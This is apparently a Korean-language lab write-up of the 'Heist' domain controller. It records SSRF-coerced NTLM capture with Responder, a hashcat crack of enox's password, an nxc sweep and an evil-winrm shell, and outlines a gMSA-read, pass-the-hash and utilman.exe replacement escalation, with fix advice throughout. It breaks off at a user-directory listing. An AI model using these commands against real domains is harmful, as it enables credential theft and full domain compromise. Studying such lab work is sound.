---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/ssrf
  - tech/ad/ntlm-relay
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/pth
  - tech/exec/winrm
  - tech/exec/rdp
  - tech/win/serestore
  - tech/svc/smb
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.165
domain: heist.offsec
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 8080, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
manual_tags: true
manual_cves: true
tech_count: 11
---

> [!info] 요약
> 타겟 `192.168.120.165` · Windows Server 2019 Standard(build 17763, `DC01.heist.offsec`) · Advanced · 플래그 2개 · 단일 DC Active Directory
> 진입점: 8080 "Super Secure Web Browser" 의 `?url=` **서버측 페치**로 Kali Responder 에 인증 강제 → `HEIST\enox` NetNTLMv2 캡처 → hashcat `-m 5600` 크랙(`california`) → WinRM 대화형 셸
> 권한상승: BloodHound 로 `enox → WEB ADMINS → ReadGMSAPassword → svc_apache$` 확인 → gMSA NT 해시 조회 → PtH → `SeRestorePrivilege` 로 `utilman.exe` 치환 후 RDP 로그인 화면 → SYSTEM
> 시행착오·교훈 → [[_PLAYBOOK]]

이 노트 코드블록의 출처 구분 — 박스 세션(2026-07-08 13:56~15:51) 당시의 실측은 Kali 산출물 `~/PG/Heist/`(`nmap.log` · `hash.txt` · BloodHound JSON 7종 · feroxbuster `.state`)와 볼트 스크린샷 14장임. BloodHound JSON 의 `jq` 조회 · nxc 소스 조회 · `hash.txt` 디코드 블록은 **박스 정지 후 보존 산출물을 다시 연 것**이라, Kali 프롬프트가 붙어 있어도 그 시각의 세션 캡처는 아님 `[가정]`. 실행하지 않은 절차는 코드펜스 밖 산문으로만 적고 「관측 없음」을 그 자리에 명시함.

`svc_apache$` 가 왜 `SeRestorePrivilege` 를 가졌는지는 BloodHound 가 수집하지 않는 정보(User Rights Assignment)라 `[가정]` 으로 표시함.

## Target #1 – 192.168.120.165

### Initial Access – 8080 웹 브라우저 프록시의 서버측 URL 페치가 DC 의 도메인 계정 인증을 공격자 호스트로 강제해 NetNTLMv2 유출과 오프라인 크랙으로 이어짐

**Vulnerability Explanation:** 8080 Flask 앱(Werkzeug 2.0.1 / Python 3.9.0)이 `?url=` 로 받은 임의 URL 을 **서버측에서 페치**함.

- 페치 프로세스가 도메인 사용자 `HEIST\enox` 의 로그온 세션에서 구동 — 공격자 호스트를 가리키면 그 세션의 인증이 밖으로 나감
- Windows 클라이언트는 `401 Unauthorized` + `WWW-Authenticate: NTLM` 을 만나면 사용자에게 묻지 않고 현재 로그온 세션 자격증명으로 NTLM 챌린지·리스폰스를 수행. SSO 의 설계 의도이고, 공격자가 서버 역할을 맡으면 **강제 인증(coerced authentication)** 이 됨. SSRF 의 결과가 데이터 유출이 아니라 자격증명 유출임
- 나가는 값은 평문도 NT 해시도 아닌 `NTProofStr` 이라 그대로 재사용 불가 — 릴레이 아니면 오프라인 크랙 둘 중 하나임. 이 박스는 SMB 서명 필수 + 단일 호스트라 릴레이가 죽고 크랙만 남음
- `enox` 의 비밀번호가 `california` (rockyou **598행**)라 2초에 깨짐

**Vulnerability Fix:**
- 서버측 페치 목적지를 허용목록으로 제한. 사설 대역(RFC1918)·링크로컬로 나가는 요청 차단
- 페치 프로세스를 도메인 인증이 불가능한 계정(`NT AUTHORITY\NETWORK SERVICE` 등)으로 분리 구동
- GPO `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers = Deny all` 로 외부 호스트 대상 NTLM 송신 차단
- 도메인 비밀번호 정책 강화 + 유출 비밀번호 사전 차단 — 강제 인증을 당해도 크랙이 안 되면 이 경로가 닫힘

**Severity:** High — 무인증 원격 요청 하나로 도메인 자격증명이 유출되고, 크랙 성공 시 곧바로 WinRM 대화형 셸(코드 실행)로 이어짐

**Steps to reproduce the attack:**
1. `sudo responder -I tun0` 으로 Kali 에 HTTP 리스너 기동
2. `http://192.168.120.165:8080/?url=http://192.168.45.175` 요청
3. Responder 콘솔의 `enox::HEIST:...` NetNTLMv2 한 줄을 편집 없이 `hash.txt` 로 저장
4. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt` → `california`
5. 획득한 자격증명을 SMB·WinRM·RDP 에 스윕해 인증 가능 서비스 확인
6. `evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'` 로 대화형 셸 → `local.txt`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.120.165 | TCP: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 8080, 9389, 49666, 49667, 49673, 49674, 49677, 49704 |

`nnmap` 은 오타가 아니라 별칭임 (`~/.zshrc:247`):

```bash
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nnmap 192.168.120.165
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 13:56 +0900
Nmap scan report for 192.168.120.165
Host is up (0.084s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 04:56:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-08T04:58:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2026-07-07T04:55:18
|_Not valid after:  2027-01-06T04:55:18
| rdp-ntlm-info:
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T04:57:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-08T04:57:39
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   83.50 ms 192.168.45.1
2   83.37 ms 192.168.45.254
3   83.82 ms 192.168.251.1
4   83.90 ms 192.168.120.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.39 seconds
```
— 출처: `~/PG/Heist/nmap.log` (3243B, 2026-07-08 13:58:21). 본문은 파일과 바이트 일치이고, 첫·끝 줄만 파일의 `#` 주석 대신 터미널 stdout 형식임.

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 8080 은 `nmap-services` 에 등재돼 있어 top-1000 에도 들어옴 — 놓칠 위험은 없음. `-p-` 가 실제로 벌어주는 것은 고번호 RPC 대역(49666~49704)임 |
| `-sCV` | 기본 NSE + 버전 탐지 | `rdp-ntlm-info`·`ssl-cert`·`smb2-security-mode` 가 통째로 사라짐. 도메인 FQDN·DC 호스트명·SMB 서명 정책이 전부 이 셋에서 나옴 |
| `-Pn` | ping 사전 탐지 생략 | Windows 방화벽은 기본적으로 ICMP echo 를 막음. 빼면 「호스트 다운」으로 오판하고 스캔 자체를 안 함 |
| `-A` | OS 추측 + traceroute | 버전 판정의 독립 근거 하나가 사라짐 |
| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 전수가 수십 분 → 132초 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 재실행 없이 다시 봄. 이 절의 모든 서술이 이 파일 하나에서 나옴 |

**버전 판정 — 독립 근거 2개.** `ssl-cert` 의 `commonName=DC01.heist.offsec` 과 `rdp-ntlm-info` 의 `Product_Version: 10.0.17763` 이 서로를 교차 검증함. 세 번째로 `nxc` 의 SMB 배너가 `Windows 10 / Server 2019 Build 17763 x64 (name:DC01)` 을 독립적으로 확인함(`Initial Access` 재현 절의 스윕 출력).

**DC 확정 근거.** `53`(DNS) + `88`(Kerberos) + `389`/`636`(LDAP/LDAPS) + `3268`/`3269`(Global Catalog) + `445` + `464`(kpasswd) + `9389`(AD Web Services)가 한 호스트에 모여 있음. 특히 `3268` 은 DC 에만 뜸 — 도메인 가입 멤버 서버에는 없음. 여기에 `5985`(WinRM)까지 열려 있어 **자격증명 하나만 얻으면 바로 대화형 셸**임.

**`Message signing enabled and required` — 이 한 줄이 공격 전략을 가름.** DC 는 SMB 서명이 기본 필수라 NetNTLMv2 를 잡아도 SMB 릴레이가 성립하지 않음. 릴레이가 죽으면 남는 길은 오프라인 크랙임. 반대로 `enabled but not required` 가 보이면 그때가 `ntlmrelayx` 를 꺼낼 때임.

**Kerberos 시계는 용의자가 아님.** `ssl-date` 의 `0s from scanner time`, `smb2-time` 의 `date: 2026-07-08T04:57:39`, 88 포트 배너의 `server time: 2026-07-08 04:56:41Z` — 독립 근거 셋이 일치함. 이 박스는 처음부터 끝까지 NTLM 인증만으로 풀려 Kerberos 를 한 번도 쓰지 않았음.

**8080 — "Super Secure Web Browser"**

`http-title: Super Secure Web Browser`. Werkzeug 2.0.1 / Python 3.9.0 → Flask 앱.

![[Pasted image 20260708140815.png]]

화면에는 `Enter URL` 입력창 하나뿐임. 아무 값이나 넣으면 주소창이 `?url=a` 로 바뀜 — 파라미터는 `url` 하나, GET 임.

![[Pasted image 20260708140840.png]]

반환된 것은 Chromium 오프라인 오류 페이지를 흉내낸 테마 페이지였음. 즉 서버가 그 URL 을 실제로 가져오려 시도했고 유효하지 않은 호스트 `a` 라 실패한 것임.

판단할 것은 하나 — **누가 그 요청을 보내는가.** 브라우저가 보내면 클라이언트측 리디렉트라 쓸모없고, 서버가 보내면 그 요청은 DC 위에서 DC 의 로그온 세션 컨텍스트로 나감. 판별법은 **Kali 를 가리키고 리스너를 띄우는 것** — 요청이 오면 서버측이고 소스 IP 가 타겟 IP 임.

**디렉터리 브루트포싱 — 완주 전 중단, 소득 0건**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ feroxbuster -u http://192.168.120.165:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt
```

중단 시점의 재개용 상태파일이 남아 있어 결과를 그대로 파싱함:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ python3 -c "
import json
d=json.load(open('ferox-http_192_168_120_165_8080_-1783487413.state'))
print(d['scans'][0]['requests_made_so_far'], '/', d['scans'][0]['num_requests'])
for x in d['responses']: print(x['status'], x['content_length'], x['url'])"
148104 / 622887
200 3608 http://192.168.120.165:8080/
```
— 출처: `~/PG/Heist/ferox-http_192_168_120_165_8080_-1783487413.state`

**148,104개 요청을 던져 얻은 것은 루트 `/` 하나(200, 3608 bytes).** 숨은 엔드포인트는 없었음.

### Initial Access – 강제 인증 → NetNTLMv2 크랙 → WinRM

**Responder 대기**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ sudo responder -I tun0
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.175]
    Challenge set              [random]

[*] Version: Responder 3.1.7.0

[+] Listening for events...
```

![[Pasted image 20260708140946.png]]

배너에서 읽어야 할 세 줄:

| 줄 | 의미 |
|---|---|
| `HTTP server [ON]` | 이 박스의 트리거가 HTTP 라 이 줄이 켜져 있어야 성립함 |
| `Responder IP [192.168.45.175]` | `?url=` 에 넣을 주소가 이것임. VPN 재연결로 바뀌므로 매번 확인 |
| `Challenge set [random]` | 서버 챌린지가 매번 달라짐 — 레인보우 테이블이 무의미해지고 사전 크랙만 남음 |

Kali 기본 설정이 HTTP 서버를 켠 채 출하되는 것을 설정 파일에서 확인함:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "^(SMB|HTTP|HTTPS|LDAP|Challenge)" /usr/share/responder/Responder.conf
SMB      = On
HTTP     = On
HTTPS    = On
LDAP     = On
Challenge = Random
```

**페이로드 투입 — `?url=` 에 Kali 를 가리킴**

```text
http://192.168.120.165:8080/?url=http://192.168.45.175
```

![[Pasted image 20260708140909.png]]

`http://` 스킴을 반드시 명시할 것. `?url=192.168.45.175` 처럼 스킴 없이 넣었을 때 이 앱이 어떻게 동작하는지는 **관측 없음**.

경로는 무의미함 — `?url=http://192.168.45.175/anything` 이어도 같음. 인증은 첫 요청에 대한 `401` 응답에서 발생하므로 **목적은 응답 본문을 받아내는 것이 아니라 401 을 한 번 받게 하는 것**임. 이 구분이 SSRF 사고와 강제 인증 사고를 가름.

같은 자리에서 SMB 를 노리려면 `?url=\\192.168.45.175\share` 형태의 UNC 를 시도함. 성공하면 캡처 blob 의 `MsvAvTargetName` 이 `cifs/...` 로 바뀜([[Vault]] 가 그 형태). **이 박스에서는 시도하지 않았음.**

**해시 캡처**

```bash
[HTTP] NTLMv2 Client   : 192.168.120.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:a9a24c7373e7eaf6:812295EA02430380A3C69B6C8CD67A27:01010000000000007062E9B8970EDD010F8C5BB3E46D76E3000000000200080054004A004A00370001001E00570049004E002D00370031004A00470058004100340051005500300050000400140054004A004A0037002E004C004F00430041004C0003003400570049004E002D00370031004A00470058004100340051005500300050002E0054004A004A0037002E004C004F00430041004C000500140054004A004A0037002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```
— 출처: `파일보관\Pasted image 20260708140953.png` (Responder 콘솔 3줄). 해시 한 줄은 `~/PG/Heist/hash.txt`(663B, 2026-07-08 14:10:20)와 **바이트 일치**함.

![[Pasted image 20260708140953.png]]

`NTLMv2 Client : 192.168.120.165` — **소스가 타겟 IP 임.** 이것으로 「서버측 페치」가 확정됨.

인과를 추측이 아니라 blob 자체로 확정할 수 있음. NetNTLMv2 blob 의 AV_PAIR 에는 클라이언트가 어느 서비스에 인증하려 했는지가 들어 있음:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ python3 - <<'EOF'
import binascii,struct
p=open('hash.txt').read().strip().split(':')
print('user=',p[0],'domain=',p[2],'challenge=',p[3])
print('NTProofStr=',p[4])
b=binascii.unhexlify(p[5]); i=28
while i+4<=len(b):
    aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
    v=b[i:i+alen]; i+=alen
    if aid==0: break
    if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
EOF
user= enox domain= HEIST challenge= a9a24c7373e7eaf6
NTProofStr= 812295EA02430380A3C69B6C8CD67A27
MsvAvTargetName = HTTP/192.168.45.175
```

**`HTTP/192.168.45.175`** — 인증이 HTTP 로 왔음. SMB 가 아님. 즉 UNC 트릭이 아니라 **웹 페치가 트리거**였음이 blob 자체로 증명됨. 대조: [[Vault]] 의 같은 필드는 `cifs/192.168.45.175` 임 — 한 필드로 진입 벡터가 갈림.

**NetNTLMv2 해시 필드 해부** — `hash.txt` 를 콜론으로 자르면 이렇게 됨:

| 필드 | 값 | 정체 |
|---|---|---|
| `enox` | 사용자명 | 크랙 후 그대로 쓸 계정 |
| (빈칸) | LM 필드 | NTLMv2 에서는 비어 있음 |
| `HEIST` | 도메인(NetBIOS) | HMAC 입력에 들어감 — 형태가 바뀌면 크랙 실패 |
| `a9a24c7373e7eaf6` | 서버 챌린지 | Responder 가 만든 8바이트 |
| `812295EA...67A27` | NTProofStr | HMAC-MD5(NTLMv2Hash, 서버챌린지‖blob). 크랙이 맞춰야 할 값 |
| `0101000000000000...` | blob | 타임스탬프 + 클라이언트 챌린지 + AV_PAIR 목록. HMAC 입력에 통째로 들어감 |

크랙 알고리즘 — 후보 비밀번호 `p` 에 대해 `NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE(USER.upper() + DOMAIN))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr` 과 같으면 정답.

> [!warning] 해시를 한 글자도 편집하지 말 것
> 사용자명·도메인·blob 이 전부 HMAC 입력임. 줄바꿈이 끼거나 도메인을 `heist.offsec`(FQDN)으로 바꿔 적으면 정답 비밀번호를 넣어도 크랙이 실패함. Responder 출력에서 `[HTTP] NTLMv2 Hash :` 뒤의 한 줄 전체를 그대로 파일에 넣을 것.

**크랙**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 11147/22294 MB (4096 MB allocatable), 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENOX::HEIST:a9a24c7373e7eaf6:812295ea02430380a3c69b6c8cd67a27:01010000000000007062e9b8970edd010f8c5bb3e46d76e3000000000200080054004a004a00370001001e00570049004e002d00370031004a00470058004100340051005500300050000400140054004a004a0037002e004c004f00430041004c0003003400570049004e002d00370031004a00470058004100340051005500300050002e0054004a004a0037002e004c004f00430041004c000500140054004a004a0037002e004c004f00430041004c00080030003000000000000000000000000030000098bf0d68bea36ac69f27f02b4b5580b35a970eaa12f2c2d466ba29e944a8c58c0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003100370035000000000000000000:california

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Wed Jul  8 14:10:29 2026 (0 secs)
Time.Estimated...: Wed Jul  8 14:10:29 2026 (0 secs)
Speed.#01........:  1244.3 kH/s (1.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Candidates.#01...: 123456 -> oooooo
```

![[Pasted image 20260708141125.png]]

`Progress: 4096/14344385` — 1,434만 후보 중 **첫 배치 4,096개** 안에서 끝났음. 2초.

⚠️ `Progress` 는 **처리한 후보 수**이지 정답의 순번이 아님. hashcat 은 배치 단위로 세므로 정답이 몇 번째였는지는 이 줄로 알 수 없고, 실제로 `california` 는 rockyou **598행**임(`grep -n -x california /usr/share/wordlists/rockyou.txt`). 배치 경계까지 올림된 숫자를 순번으로 읽으면 워드리스트 위치를 7배 과대평가함.

**획득: `heist.offsec\enox : california`**

**자격증명을 4개 프로토콜에 한 번에 던짐**

`nxc-sweep` 은 `/usr/local/bin/` 에 둔 bash 래퍼로, 열린 포트를 확인하고 `nxc` 를 프로토콜별로 순차 실행함.

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nxc-sweep 192.168.120.165 -u 'enox' -p 'california'
[*] Starting NXC sweep for 192.168.120.165 as enox ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.165 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
SMB         192.168.120.165 445    DC01             [+] heist.offsec\enox:california
SMB         192.168.120.165 445    DC01             [*] Enumerated shares
SMB         192.168.120.165 445    DC01             Share           Permissions     Remark
SMB         192.168.120.165 445    DC01             -----           -----------     ------
SMB         192.168.120.165 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.120.165 445    DC01             C$                              Default share
SMB         192.168.120.165 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.120.165 445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.120.165 445    DC01             SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.165 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:heist.offsec)
WINRM       192.168.120.165 5985   DC01             [+] heist.offsec\enox:california (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.165 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:heist.offsec) (nla:False)
RDP         192.168.120.165 3389   DC01             [+] heist.offsec\enox:california

[-] Port 1433 closed/filtered. Skipping mssql
[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

![[Pasted image 20260708141241.png]]

이 출력에서 뽑을 네 가지:

1. `ADMIN$`·`C$` 에 **권한 표시가 없음** → `enox` 는 로컬 관리자가 아님
2. `signing:True` → SMB 서명 필수 판정의 두 번째 독립 근거
3. `nla:False` → RDP 로그인 화면 경로가 살아 있음(`Privilege Escalation` 절에서 사용)
4. WinRM 인증 성공 → **대화형 셸 가능.** 플래그는 반드시 여기서 읽음([[Butch]])

> [!danger] WinRM 줄의 `(Pwn3d!)` 는 관리자라는 뜻이 아님 — nxc 소스로 확인함
> BloodHound 상 `Administrators` 의 멤버는 기본 principal 셋뿐이고 `enox` 는 없음:
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ jq -r '.data[] | select(.Properties.name=="ADMINISTRATORS@HEIST.OFFSEC") | .Members[].ObjectIdentifier' 20260708141821_groups.json
> S-1-5-21-537427935-490066102-1511301751-512
> S-1-5-21-537427935-490066102-1511301751-519
> S-1-5-21-537427935-490066102-1511301751-500
> ```
> RID 로 읽으면 `-512` = Domain Admins, `-519` = Enterprise Admins, `-500` = Administrator 임. 그런데도 `(Pwn3d!)` 가 붙음 — Kali 의 nxc 소스가 이유를 설명함:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ sed -n '122,134p' /usr/lib/python3/dist-packages/nxc/protocols/winrm.py
>     def check_if_admin(self):
>         wsman = self.conn.wsman
>         wsen = NAMESPACES["wsen"]
>         wsmn = NAMESPACES["wsman"]
>
>         enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
>         ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
>         ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"
>
>         wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
>         self.admin_privs = True
>         return True
> ```
> **`admin_privs = True` 를 무조건 대입하고 반환함.** `wsman.enumerate()` 의 결과를 보지 않음. 즉 WinRM 줄의 `(Pwn3d!)` 는 「WinRM 인증이 됐다 = 셸을 얻을 수 있다」는 뜻일 뿐임. **SMB 줄의 `(Pwn3d!)` 는 다름** — 그쪽은 `ADMIN$` 접근 성공을 실제로 확인함.

**WinRM 셸 · local.txt**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enox\Documents> type c:\users\enox\desktop\local.txt
a1909577c8fb09bed9a1ff474af80620
```

**Local.txt value:**

`a1909577c8fb09bed9a1ff474af80620`

⚠️ 신원 명령과 플래그를 한 화면에 담은 `proof_user.txt` 형식 증거는 **남기지 않았음(관측 없음).** 대화형 획득의 근거는 evil-winrm 세션의 `*Evil-WinRM* PS ...>` 프롬프트가 유일함. 시험에서는 다음 형태로 한 화면에 담아야 인정됨:

```powershell
whoami; hostname; ipconfig | findstr IPv4; type C:\Users\enox\Desktop\local.txt
```

⚠️ 웹셸에서 읽은 플래그는 0점임 — 규정 원문이 *"this includes any type of web-based shell"*. evil-winrm 은 대화형 셸이라 문제없음.

### Privilege Escalation – gMSA 비밀번호 읽기 → PtH → SeRestorePrivilege

**Vulnerability Explanation:** 두 오설정이 체인됨.

- `WEB ADMINS` 그룹(유일 멤버 `enox`)이 gMSA `svc_apache$` 의 `msDS-GroupMSAMembership` 에 등재됨 → LDAP 속성 `msDS-ManagedPassword` 조회 한 번으로 그 계정의 NT 해시를 읽음. gMSA 비밀번호는 240바이트(유니코드 120자) 랜덤이라 크랙은 불가하지만 **읽기는 ACL 문제**임. BloodHound 의 `ReadGMSAPassword` 엣지가 정확히 이 속성을 읽어 만든 것임
- `svc_apache$` 가 `SeRestorePrivilege` 를 Enabled 로 보유 → 파일 DACL 을 무시하고 `%SystemRoot%\System32` 에 쓰기·이름변경 가능. `utilman.exe` 를 `cmd.exe` 로 치환하면 RDP 로그인 화면의 접근성 버튼이 **로그온 전 컨텍스트인 `NT AUTHORITY\SYSTEM`** 으로 그 파일을 실행
- 이 특권의 출처는 `Backup Operators`·`Server Operators` 가 아님 — 두 그룹 모두 멤버 0명임. User Rights Assignment(로컬 보안 정책 / GPO)로 계정에 직접 부여된 것으로 봄 `[가정]`. **BloodHound 는 URA 를 수집하지 않아 그래프에 이 경로가 없음**
- RDP 의 `nla:False` 가 전제조건임. NLA 가 켜져 있으면 화면이 그려지기 전에 자격증명을 요구해 Win+U 를 누를 화면 자체가 없음

**Vulnerability Fix:**
- `msDS-GroupMSAMembership` 을 그 서비스를 실제로 실행하는 **호스트 계정만**으로 좁힐 것. 사람 그룹(`WEB ADMINS`)을 넣지 말 것
- 서비스 계정에서 `SeRestorePrivilege` 회수 — 백업/복원 특권은 서비스 계정에 거의 항상 과잉임
- DC 의 RDP 에 NLA 강제(`SecurityLayer=2`, `UserAuthentication=1`), RDP 접근을 관리 네트워크로 제한
- `System32` 접근성 바이너리(`utilman.exe`·`sethc.exe`) 무결성 모니터링 — 파일 감사 정책 + Sysmon EventID 11

**Severity:** Critical — 저권한 도메인 사용자에서 도메인 컨트롤러의 `NT AUTHORITY\SYSTEM` 까지 즉시 상승

**Steps to reproduce the attack:**
1. `bloodhound-python -c All` 수집 → `enox → WEB ADMINS → ReadGMSAPassword → svc_apache$` 확인
2. `bloodyAD ... get object 'svc_apache$' --attr msDS-ManagedPassword` 로 NT 해시 회수
3. `evil-winrm -u 'svc_apache$' -H '<NT해시>'` 로 Pass-the-Hash 셸
4. `whoami /priv` 에서 `SeRestorePrivilege` Enabled 확인
5. `System32` 에서 `ren utilman.exe utilman.old` → `ren cmd.exe Utilman.exe`
6. `xfreerdp3 /v:192.168.120.165 /cert:ignore /sec:tls` 로 자격증명 없이 로그인 화면 도달
7. Win+U → SYSTEM 콘솔 → `proof.txt`
8. 원복: `ren Utilman.exe cmd.exe` → `ren utilman.old utilman.exe`

**열거 — 사용자 목록**

```powershell
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:25 AM                Administrator
d-----        7/20/2021   4:17 AM                enox
d-r---        5/28/2021   3:53 AM                Public
d-----        9/14/2021   8:27 AM                svc_apache$
```

